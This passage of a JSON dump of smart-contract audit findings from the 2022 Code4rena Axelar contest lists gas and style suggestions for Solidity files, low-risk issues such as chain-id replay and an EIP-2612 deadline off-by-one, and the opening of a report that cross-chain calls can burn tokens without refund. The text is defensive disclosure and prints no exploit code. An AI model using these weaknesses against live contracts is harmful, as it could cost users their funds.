keccak256('owner-count');\n```\n25. File: src/AxelarGatewayMultisig.sol (line [29](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L29))\n```solidity\n    bytes32 internal constant PREFIX_OWNER_THRESHOLD = keccak256('owner-threshold');\n```\n26. File: src/AxelarGatewayMultisig.sol (line [30](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L30))\n```solidity\n    bytes32 internal constant PREFIX_IS_OWNER = keccak256('is-owner');\n```\n27. File: src/AxelarGatewayMultisig.sol (line [32](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L32))\n```solidity\n    bytes32 internal constant KEY_OPERATOR_EPOCH = keccak256('operator-epoch');\n```\n28. File: src/AxelarGatewayMultisig.sol (line [34](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L34))\n```solidity\n    bytes32 internal constant PREFIX_OPERATOR = keccak256('operator');\n```\n29. File: src/AxelarGatewayMultisig.sol (line [35](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L35))\n```solidity\n    bytes32 internal constant PREFIX_OPERATOR_COUNT = keccak256('operator-count');\n```\n30. File: src/AxelarGatewayMultisig.sol (line [36](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L36))\n```solidity\n    bytes32 internal constant PREFIX_OPERATOR_THRESHOLD = keccak256('operator-threshold');\n```\n31. File: src/AxelarGatewayMultisig.sol (line [37](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L37))\n```solidity\n    bytes32 internal constant PREFIX_IS_OPERATOR = keccak256('is-operator');\n```\n\n### Duplicated `require()`/`revert()` checks should be refactored to a modifier or function\n\n1. File: src/ERC20.sol (line [205](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20.sol#L205))\n```solidity\n        require(account != address(0), 'ZERO_ADDR');\n```\n\n### State variables only set in the constructor should be declared `immutable`\n\n1. File: src/ERC20.sol (line [40](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20.sol#L40))\n```solidity\n    string public name;\n```\n2. File: src/ERC20.sol (line [41](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20.sol#L41))\n```solidity\n    string public symbol;\n```\n3. File: src/MintableCappedERC20.sol (line [12](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/MintableCappedERC20.sol#L12))\n```solidity\n    uint256 public cap;\n```\n\n### Use custom errors rather than `revert()`/`require()` strings to save deployment gas\n\n1. File: src/ERC20.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20.sol))\n2. File: src/DepositHandler.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/DepositHandler.sol))\n3. File: src/BurnableMintableCappedERC20.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/BurnableMintableCappedERC20.sol))\n4. File: src/Ownable.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/Ownable.sol))\n5. File: src/AxelarGatewayProxy.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayProxy.sol))\n6. File: src/MintableCappedERC20.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/MintableCappedERC20.sol))\n7. File: src/ERC20Permit.sol (Various lines throughout the [file](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20Permit.sol))\n\n### Functions guaranteed to revert when called by normal users can be marked `payable`\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.\n\n1. File: src/AxelarGateway.sol (line [234](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L234))\n```solidity\n    function freezeToken(string memory symbol) external override onlyAdmin {\n```\n2. File: src/AxelarGateway.sol (line [240](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L240))\n```solidity\n    function unfreezeToken(string memory symbol) external override onlyAdmin {\n```\n3. File: src/AxelarGateway.sol (line [246](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L246))\n```solidity\n    function freezeAllTokens() external override onlyAdmin {\n```\n4. File: src/AxelarGateway.sol (line [252](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L252))\n```solidity\n    function unfreezeAllTokens() external override onlyAdmin {\n```\n5. File: src/AxelarGateway.sol (lines [258-262](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L258-L262))\n```solidity\n    function upgrade(\n        address newImplementation,\n        bytes32 newImplementationCodeHash,\n        bytes calldata setupParams\n    ) external override onlyAdmin {\n```\n6. File: src/AxelarGatewayMultisig.sol (line [362](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L362))\n```solidity\n    function deployToken(bytes calldata params, bytes32) external onlySelf {\n```\n7. File: src/AxelarGatewayMultisig.sol (line [371](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L371))\n```solidity\n    function mintToken(bytes calldata params, bytes32) external onlySelf {\n```\n8. File: src/AxelarGatewayMultisig.sol (line [377](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L377))\n```solidity\n    function burnToken(bytes calldata params, bytes32) external onlySelf {\n```\n9. File: src/AxelarGatewayMultisig.sol (line [383](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L383))\n```solidity\n    function approveContractCall(bytes calldata params, bytes32 commandId) external onlySelf {\n```\n10. File: src/AxelarGatewayMultisig.sol (line [404](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L404))\n```solidity\n    function approveContractCallWithMint(bytes calldata params, bytes32 commandId) external onlySelf {\n```\n11. File: src/AxelarGatewayMultisig.sol (line [429](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L429))\n```solidity\n    function transferOwnership(bytes calldata params, bytes32) external onlySelf {\n```\n12. File: src/AxelarGatewayMultisig.sol (line [440](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L440))\n```solidity\n    function transferOperatorship(bytes calldata params, bytes32) external onlySelf {\n```\n13. File: src/BurnableMintableCappedERC20.sol (line [48](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/BurnableMintableCappedERC20.sol#L48))\n```solidity\n    function burn(bytes32 salt) public onlyOwner {\n```\n14. File: src/Ownable.sol (line [20](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/Ownable.sol#L20))\n```solidity\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n```\n15. File: src/MintableCappedERC20.sol (line [23](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/MintableCappedERC20.sol#L23))\n```solidity\n    function mint(address account, uint256 amount) public onlyOwner {\n```\n16. File: src/MintableCappedERC20.sol (line [31](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/MintableCappedERC20.sol#L31))\n```solidity\n    function burnFrom(address account, uint256 amount) external onlyOwner {\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/39"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low Risk Issues\n\n### Cross-chain replay attacks\nStoring the `block.chainid` is not safe. See [this](https://github.com/code-423n4/2021-04-maple-findings/issues/2) issue from a prior contest for details.\n1. File: src/ERC20Permit.sol (lines [23-28](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/ERC20Permit.sol#L23-L28))\n```solidity\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                DOMAIN_TYPE_SIGNATURE_HASH,\n                keccak256(bytes(name)),\n                keccak256(bytes('1')),\n                block.chainid,\n```\n\n### Incorrect EIP-2612 deadline check\n> allow `transferFrom` to occur while `expiry >= block.timestamp`.\n\nhttps://github.com/ethereum/EIPs/blob/1473025f064929bfab405eb00b8cd16dd741f269/EIPS/eip-2612.md?plain=1#L172\nThe current code should change to use `<=`\n1. File: src/ERC20Permit.sol (line [43](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/ERC20Permit.sol#L43))\n```solidity\n        require(block.timestamp < deadline, 'EXPIRED');\n```\n\n\n\n### Unumplemented functions should have the default behavior of `revert()`ing rather than allowing operations to go through\n\n1. File: src/interfaces/IAxelarExecutable.sol (lines [55-67](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/interfaces/IAxelarExecutable.sol#L55-L67))\n```solidity\n    function _execute(\n        string memory sourceChain,\n        string memory sourceAddress,\n        bytes calldata payload\n    ) internal virtual {}\n\n    function _executeWithToken(\n        string memory sourceChain,\n        string memory sourceAddress,\n        bytes calldata payload,\n        string memory tokenSymbol,\n        uint256 amount\n    ) internal virtual {}\n```\n\n\n### Missing checks for `address(0x0)` when assigning values to `address` state variables\n\n1. File: src/AxelarGateway.sol (line [67](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L67))\n```solidity\n        TOKEN_DEPLOYER_IMPLEMENTATION = tokenDeployerImplementation;\n```\n\n### Open TODOs\nCode architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment\n\n1. File: src/MintableCappedERC20.sol (line [30](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/MintableCappedERC20.sol#L30))\n```solidity\n    // TODO move burnFrom into a separate BurnableERC20 contract\n```\n\n\n### Missing contract-existence checks before low-level calls\nLow-level calls return success if there is no code present at the specified address. In addition to the zero-address checks, add a check to verify that `<address>.code.length > 0`\n1. File: src/AxelarGateway.sol (lines [398-415](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGateway.sol#L398-L415))\n```solidity\n        if (tokenAddress == address(0)) revert TokenDoesNotExist(symbol);\n\n        if (_getTokenType(symbol) == TokenType.External) {\n            _checkTokenStatus(symbol);\n\n            DepositHandler depositHandler = new DepositHandler{ salt: salt }();\n\n            (bool success, bytes memory returnData) = depositHandler.execute(\n                tokenAddress,\n                abi.encodeWithSelector(\n                    IERC20.transfer.selector,\n                    address(this),\n                    IERC20(tokenAddress).balanceOf(address(depositHandler))\n                )\n            );\n\n            if (!success || (returnData.length != uint256(0) && !abi.decode(returnData, (bool))))\n                revert BurnFailed(symbol);\n```\n\n2. File: src/AxelarGatewayProxy.sol (line [19](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGatewayProxy.sol#L19))\n```solidity\n        (bool success, ) = gatewayImplementation.delegatecall(\n```\n\n3. File: src/AxelarGatewayProxy.sol (line [34](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGatewayProxy.sol#L34))\n```solidity\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n```\n\n4. File: src/AxelarGateway.sol (line [350](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGateway.sol#L350))\n```solidity\n            (bool success, bytes memory data) = TOKEN_DEPLOYER_IMPLEMENTATION.delegatecall(\n```\n\n\n\n## Non-critical Issues\n\n\n### `require()`/`revert()` statements should have descriptive reason strings\n\n1. File: src/DepositHandler.sol (line [12](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/DepositHandler.sol#L12))\n```solidity\n        require(_lockedStatus == IS_NOT_LOCKED);\n```\n\n### `public` functions not called by the contract should be declared `external` instead\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n1. File: src/BurnableMintableCappedERC20.sol (line [48](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/BurnableMintableCappedERC20.sol#L48))\n```solidity\n    function burn(bytes32 salt) public onlyOwner {\n```\n2. File: src/MintableCappedERC20.sol (line [23](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/MintableCappedERC20.sol#L23))\n```solidity\n    function mint(address account, uint256 amount) public onlyOwner {\n```\n\n### `constant`s should be defined rather than using magic numbers\n\n1. File: src/BurnableMintableCappedERC20.sol (line [37](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/BurnableMintableCappedERC20.sol#L37))\n```solidity\n                                bytes1(0xff),\n```\n2. File: src/ECDSA.sol (line [33](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ECDSA.sol#L33))\n```solidity\n        if (signature.length != 65) revert InvalidSignatureLength();\n```\n3. File: src/ECDSA.sol (line [58](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ECDSA.sol#L58))\n```solidity\n        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) revert InvalidS();\n```\n4. File: src/ECDSA.sol (line [60](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ECDSA.sol#L60))\n```solidity\n        if (v != 27 && v != 28) revert InvalidV();\n```\n5. File: src/ECDSA.sol (line [60](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ECDSA.sol#L60))\n```solidity\n        if (v != 27 && v != 28) revert InvalidV();\n```\n6. File: src/ERC20Permit.sol (line [44](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20Permit.sol#L44))\n```solidity\n        require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, 'INV_S');\n```\n7. File: src/ERC20Permit.sol (line [45](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20Permit.sol#L45))\n```solidity\n        require(v == 27 || v == 28, 'INV_V');\n```\n8. File: src/ERC20Permit.sol (line [45](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20Permit.sol#L45))\n```solidity\n        require(v == 27 || v == 28, 'INV_V');\n```\n\n### Use a more recent version of solidity\nUse a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`\n\n1. File: src/AxelarGateway.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGateway.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n2. File: src/AdminMultisigBase.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n3. File: src/AxelarGatewayMultisig.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AxelarGatewayMultisig.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n4. File: src/BurnableMintableCappedERC20.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/BurnableMintableCappedERC20.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n5. File: src/ECDSA.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ECDSA.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n6. File: src/ERC20Permit.sol (line [3](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20Permit.sol#L3))\n```solidity\npragma solidity 0.8.9;\n```\n\n### Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate\n\n1. File: src/ERC20.sol (lines [34-36](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20.sol#L34-L36))\n```solidity\n    mapping(address => uint256) public override balanceOf;\n\n    mapping(address => mapping(address => uint256)) public override allowance;\n```\n\n### Variable names that consist of all capital letters should be reserved for `const`/`immutable` variables\nIf the variable needs to be different based on which class it comes from, a `view`/`pure` _function_ should be used instead (e.g. like [this](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/76eee35971c2541585e05cbf258510dda7b2fbc6/contracts/token/ERC20/extensions/draft-IERC20Permit.sol#L59)).\n\n1. File: src/ERC20Permit.sol (line [8](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20Permit.sol#L8))\n```solidity\n    bytes32 public DOMAIN_SEPARATOR;\n```\n\n### File is missing NatSpec\n\n1. File: src/AdminMultisigBase.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/AdminMultisigBase.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n2. File: src/DepositHandler.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/DepositHandler.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n3. File: src/BurnableMintableCappedERC20.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/BurnableMintableCappedERC20.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n4. File: src/Ownable.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/Ownable.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n5. File: src/TokenDeployer.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/TokenDeployer.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n6. File: src/interfaces/IAxelarGateway.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n7. File: src/interfaces/IAxelarGatewayMultisig.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGatewayMultisig.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n8. File: src/interfaces/IERC20BurnFrom.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IERC20BurnFrom.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n9. File: src/interfaces/IAxelarExecutable.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarExecutable.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n10. File: src/MintableCappedERC20.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/MintableCappedERC20.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n11. File: src/ERC20Permit.sol (line [0](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/ERC20Permit.sol#L0))\n```solidity\n// SPDX-License-Identifier: MIT\n```\n\n### Event is missing `indexed` fields\nEach `event` should use three `indexed` fields if there are three or more fields\n\n1. File: src/interfaces/IAxelarGateway.sol (lines [10-16](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L10-L16))\n```solidity\n    event TokenSent(\n        address indexed sender,\n        string destinationChain,\n        string destinationAddress,\n        string symbol,\n        uint256 amount\n    );\n```\n2. File: src/interfaces/IAxelarGateway.sol (lines [18-24](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L18-L24))\n```solidity\n    event ContractCall(\n        address indexed sender,\n        string destinationChain,\n        string destinationContractAddress,\n        bytes32 indexed payloadHash,\n        bytes payload\n    );\n```\n3. File: src/interfaces/IAxelarGateway.sol (lines [26-34](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L26-L34))\n```solidity\n    event ContractCallWithToken(\n        address indexed sender,\n        string destinationChain,\n        string destinationContractAddress,\n        bytes32 indexed payloadHash,\n        bytes payload,\n        string symbol,\n        uint256 amount\n    );\n```\n4. File: src/interfaces/IAxelarGateway.sol (line [38](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L38))\n```solidity\n    event TokenDeployed(string symbol, address tokenAddresses);\n```\n5. File: src/interfaces/IAxelarGateway.sol (line [62](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L62))\n```solidity\n    event TokenFrozen(string symbol);\n```\n6. File: src/interfaces/IAxelarGateway.sol (line [64](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGateway.sol#L64))\n```solidity\n    event TokenUnfrozen(string symbol);\n```\n7. File: src/interfaces/IAxelarGatewayMultisig.sol (line [8](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGatewayMultisig.sol#L8))\n```solidity\n    event OwnershipTransferred(address[] preOwners, uint256 prevThreshold, address[] newOwners, uint256 newThreshold);\n```\n8. File: src/interfaces/IAxelarGatewayMultisig.sol (lines [10-15](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IAxelarGatewayMultisig.sol#L10-L15))\n```solidity\n    event OperatorshipTransferred(\n        address[] preOperators,\n        uint256 prevThreshold,\n        address[] newOperators,\n        uint256 newThreshold\n    );\n```\n9. File: src/interfaces/IERC20.sol (line [74](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IERC20.sol#L74))\n```solidity\n    event Transfer(address indexed from, address indexed to, uint256 value);\n```\n10. File: src/interfaces/IERC20.sol (line [80](https://github.com/code-423n4/2022-04-axelar/blob/f1c8bfc16f82a27797f61cb3a310c0f936dce567/src/interfaces/IERC20.sol#L80))\n```solidity\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n```\n\n### Unsafe early return from a modifier\nIf the modifier is used with a function that has a named return, the default value will be returned which may lead to confusing behavior. Consider using a function instead of a modifier\n1. File: src/AdminMultisigBase.sol (lines [42-44](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AdminMultisigBase.sol#L42-L44))\n```solidity\n        if (adminVoteCount < _getAdminThreshold(adminEpoch)) return;\n\n        _;\n```\n\n\n### Consider allowing infinite approval\nDoing what [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/28dd490726f045f7137fa1903b7a6b8a52d6ffcb/contracts/token/ERC20/ERC20.sol#L129-L130) does and considering `type(uint256).max` to be infinite approval may help users to create smaller transactions.\n1. File: src/ERC20.sol (line [105](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/ERC20.sol#L105))\n```solidity\n        _approve(sender, _msgSender(), allowance[sender][_msgSender()] - amount);\n```\n\n### Consider using a two-step-transfer of ownership\nThe current owner would nominate a new owner, and to become the new owner, the nominated account would have to approve the change, so that the address is proven to be valid\n1. File: src/Ownable.sol (line [20](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/Ownable.sol#L20))\n```solidity\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n```\n\n### Consider adding a comment saying that EIP-2098 short signatures are not supported\n1. File: src/ECDSA.sol (line [33](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/ECDSA.sol#L33))\n```solidity\n        if (signature.length != 65) revert InvalidSignatureLength();\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/38"
    }
  },
  {
    "title": "Cross-chain smart contract calls can revert but source chain tokens remain burnt and are not refunded",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/e79909cfc50ee03ac7194a42cdde0eaf5cf07713/src/AxelarGateway.sol#L105\n\n\n# Vulnerability details\n\n### Impact\n\nSmart contract calls often revert. In such cases any ether sent along with the transaction is returned and sometimes the remaining gas (depending on whether an `assert` caused the reversion or not).\n\nFor contracts involving ERC20 tokens it is also expected that, should a contract call fail, one's tokens are not lost/transferred elsewhere.\n\nThe [callContractWithToken](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGateway.sol#L98-L115) function does not appear to take contract call failure on the destination chain into account, even though this could be quite a common occurrence.\n\nTokens are burned on [line 105](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGateway.sol#L105) but there is no mechanism in the code base to return these burned tokens in the case that the contract call fails on the destination chain.\n\nThe impact is that users of the Axelar Network can lose funds.\n\n### Proof of Concept\n\nI have put together an executable Proof of Concept in a fork of the repo.\nFile [DestinationChainContractCallFails.js](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/test/DestinationChainContractCallFails.js#L127) implements a test that attempts to call a token swap function on the destination chain. The [swap](https://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/test/TokenSwapper.sol#L16-L33) function was provided as part of the competition repo. Given a certain amount of token A it returns twice as much of token B.\n\nIn the test I have provided the contract call on the destination chain fails because there is simply not enough of token B in the `TokenSwapper` contract to transfer to the user. This might be rare in practice -- since adequate liquidity would generally be provided by the contract -- but cross-chain contract calls are unlikely to be limited to token swaps only! I specifically chose this example to show that cross-chain contract calls can fail _even in the cases that Axelar have already considered_ in their test suite.\n\nIn the [unit test](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/test/DestinationChainContractCallFails.js#L129) you will find:\n- Lines of note have been prefixed with `sseefried:`\n- The test is a little strange in that it _succeeds_ because it expects a `revert`. This happens on [line 380](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/test/DestinationChainContractCallFails.js#L380)\n- I took the liberty of modifying the `TokenSwapper` contract slightly [here](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/src/test/TokenSwapper.sol#L37), in order to show that the contract call reverts because of a lack of token B.\n- The amount of token A on [line 